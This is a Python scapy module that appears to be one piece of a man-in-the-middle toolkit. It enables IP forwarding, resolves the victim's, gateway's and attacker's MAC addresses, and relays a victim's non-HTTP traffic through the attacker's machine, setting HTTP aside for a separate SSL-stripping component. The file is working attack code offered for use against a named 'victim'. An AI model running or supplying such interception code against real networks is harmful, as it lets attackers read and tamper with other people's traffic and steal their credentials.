import scapy.all as scapy
import subprocess
import atexit

class PacketForwarder:
    """Packet forwarder that acts like a real gateway"""
    
    def __init__(self, interface, victim_ip, gateway_ip, attacker_ip):
        self.interface = interface
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.attacker_ip = attacker_ip
        
        self.victim_mac = None
        self.gateway_mac = None
        self.attacker_mac = None
        self.running = False
        
        atexit.register(self.cleanup)
    
    def setup(self):
        """Setup forwarding and resolve MAC addresses"""
        # Enable IP forwarding
        subprocess.run(['sudo', 'sysctl', 'net.ipv4.ip_forward=1'], 
                      check=True, capture_output=True)
        
        # Get MAC addresses
        self.victim_mac = resolve_mac(self.victim_ip, self.interface)
        self.gateway_mac = resolve_mac(self.gateway_ip, self.interface)
        self.attacker_mac = scapy.get_if_hwaddr(self.interface)
        
        if not self.victim_mac or not self.gateway_mac:
            raise Exception("Could not resolve required MAC addresses")
        
        print(f"[+] Forwarding setup complete")
        print(f"    Victim: {self.victim_ip} ({self.victim_mac})")
        print(f"    Gateway: {self.gateway_ip} ({self.gateway_mac})")
        print(f"    Attacker: {self.attacker_ip} ({self.attacker_mac})")
    
    def forward_packet(self, packet):
        """Forward packet between victim and gateway (acting like a real gateway)"""
        if not packet.haslayer(scapy.IP):
            return
        
        ip = packet[scapy.IP]
        
        # Skip packets from/to attacker to avoid loops
        if ip.src == self.attacker_ip or ip.dst == self.attacker_ip:
            return
        
        # We skip HTTP traffic as that is handled in ssl stripping code
        if packet.haslayer(scapy.TCP):
            tcp = packet[scapy.TCP]
            if tcp.dport == 80 or tcp.sport == 80:
                return
        
        # Case: packet FROM victim TO external destination
        if ip.src == self.victim_ip:
            # Forward to real gateway by changing only Ethernet headers
            packet[scapy.Ether].src = self.attacker_mac
            packet[scapy.Ether].dst = self.gateway_mac
            # IP headers remain unchanged (victim IP → destination IP)
            scapy.sendp(packet, iface=self.interface, verbose=0)
            
        # Caes: packet TO victim FROM external source (responses come back through the real gateway to us)
        elif ip.dst == self.victim_ip:
            # We change only Ethernet headers
            packet[scapy.Ether].src = self.attacker_mac
            packet[scapy.Ether].dst = self.victim_mac

            scapy.sendp(packet, iface=self.interface, verbose=0)
    
    def run(self):
        """Start packet forwarding"""
        print("[*] Starting packet forwarder...")
        
        self.setup()
        self.running = True
        
        # Capture packets involving the victim (not http)
        packet_filter = f"host {self.victim_ip} and not host {self.attacker_ip} and not port 80"
        
        print("[+] Packet forwarding active")
        print("[*] Acting as gateway for victim traffic")
        print("[*] HTTP traffic excluded (for SSL stripping)")
        print("[!] Press Ctrl+C to stop")
        
        try:
            scapy.sniff(
                iface=self.interface,
                filter=packet_filter,
                prn=self.forward_packet,
                stop_filter=lambda x: not self.running,
                store=0
            )
        except KeyboardInterrupt:
            print("\n[!] Packet forwarding stopped")
        finally:
            self.cleanup()
    
    def cleanup(self):
        """Disable forwarding"""
        if self.running:
            self.running = False
            subprocess.run(['sudo', 'sysctl', 'net.ipv4.ip_forward=0'], 
                          capture_output=True)
            print("[+] IP forwarding disabled")

def auto_detect_gateway():
    """Get default gateway IP"""
    try:
        return scapy.conf.route.route("0.0.0.0")[2]
    except:
        return None

def resolve_mac(ip, iface):
    """Sends an ARP request to resolve the MAC address for a given IP."""

    arp_req = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    ans, _ = scapy.srp(arp_req, timeout=2, iface=iface, verbose=False)

    if ans:
        return ans[0][1].hwsrc
    else:
        print(f"[!] Could not resolve MAC for {ip}")
        return None